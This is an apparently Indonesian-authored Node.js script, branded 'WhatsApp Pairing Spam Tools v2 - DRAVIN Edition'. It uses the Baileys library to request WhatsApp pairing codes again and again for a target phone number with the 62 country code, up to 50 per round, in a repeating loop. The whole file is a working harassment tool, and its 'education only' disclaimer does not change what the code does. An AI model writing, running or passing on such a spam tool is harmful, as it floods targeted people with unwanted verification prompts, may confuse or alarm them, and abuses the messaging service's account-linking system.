const { default: makeWASocket, useMultiFileAuthState } = require("@whiskeysockets/baileys");
const figlet = require("figlet");
const gradient = require("gradient-string");
const chalk = require("chalk").default; // Important change here
const readline = require("readline");
const pino = require("pino");

const sleep = (ms) => new Promise(resolve => setTimeout(resolve, ms));

const question = (text) => {
    const rl = readline.createInterface({ input: process.stdin, output: process.stdout });
    return new Promise(resolve => rl.question(text, ans => {
        rl.close();
        resolve(ans);
    }));
};

const typeEffect = async (text, delay = 20) => {
    for (const char of text) {
        process.stdout.write(char);
        await sleep(delay);
    }
    process.stdout.write('\n');
};

const showBanner = async () => {
    console.clear();
    const banner = figlet.textSync("DRAVIN", { font: "ANSI Shadow" });
    console.log(gradient.instagram.multiline(banner));
    await typeEffect(chalk.magenta("[⚙️] WhatsApp Pairing Spam Tools v2 - DRAVIN Edition"));
    await typeEffect(chalk.cyan("═════════════════════════════════════════════════════"));
    await typeEffect(chalk.green("• Gunakan hanya untuk edukasi, tanggung sendiri risikonya"));
    await typeEffect(chalk.yellow("• Target hanya berlaku untuk nomor dengan kode negara 62"));
    await typeEffect(chalk.cyan("═════════════════════════════════════════════════════\n"));
};

async function initConnection() {
    const { state } = await useMultiFileAuthState('./dravin_session');
    return makeWASocket({
        logger: pino({ level: "silent" }),
        printQRInTerminal: false,
        auth: state,
        browser: ["DRAVIN TOOLS", "CyberFox", "13.37"],
        syncFullHistory: false,
        markOnlineOnConnect: false
    });
}

async function startSpam() {
    const conn = await initConnection();

    while (true) {
        console.log(chalk.cyan("\n💡 Masukkan nomor target dan jumlah spam"));

        const nomor = await question(chalk.yellow("📱 Nomor Target (62xxxxx): "));
        if (!nomor.startsWith("62")) {
            console.log(chalk.red("❌ Nomor harus dimulai dengan 62"));
            continue;
        }

        const jumlah = parseInt(await question(chalk.yellow("🔁 Jumlah Spam (1-50): ")));
        if (isNaN(jumlah) || jumlah < 1 || jumlah > 50) {
            console.log(chalk.red("❌ Jumlah harus antara 1 dan 50"));
            continue;
        }

        console.log(chalk.green(`\n🚀 Memulai spam pairing ke ${nomor} sebanyak ${jumlah}x...\n`));
        let sukses = 0;

        for (let i = 0; i < jumlah; i++) {
            try {
                const start = Date.now();
                let kode = await conn.requestPairingCode(nomor);
                kode = kode.match(/.{1,4}/g).join('-');
                const waktu = ((Date.now() - start) / 1000).toFixed(2);

                console.log(chalk.green(`[✓] ${i + 1}/${jumlah} => Kode: ${chalk.yellow(kode)} (${waktu}s)`));
                sukses++;
                await sleep(1000);
            } catch (err) {
                console.log(chalk.red(`[X] ${i + 1}/${jumlah} => Gagal: ${err.message}`));
                await sleep(2000);
            }
        }

        console.log(chalk.cyan("\n📊 Ringkasan"));
        console.log(chalk.cyan(`├─ Nomor   : ${chalk.white(nomor)}`));
        console.log(chalk.cyan(`├─ Total   : ${chalk.white(jumlah)}`));
        console.log(chalk.cyan(`├─ Sukses  : ${chalk.green(sukses)}`));
        console.log(chalk.cyan(`└─ Gagal   : ${chalk.red(jumlah - sukses)}`));

        const ulang = await question(chalk.magenta("\n🔁 Ingin spam lagi? (y/n): "));
        if (ulang.toLowerCase() !== "y") break;
    }

    console.log(chalk.green("\n✨ Terima kasih telah menggunakan Dravin Tools!"));
    process.exit(0);
}

// Main Execution
(async () => {
    await showBanner();
    await sleep(1000);
    await typeEffect(chalk.yellow("[⌛] Menyiapkan koneksi..."));
    await sleep(1500);
    await startSpam();
})();
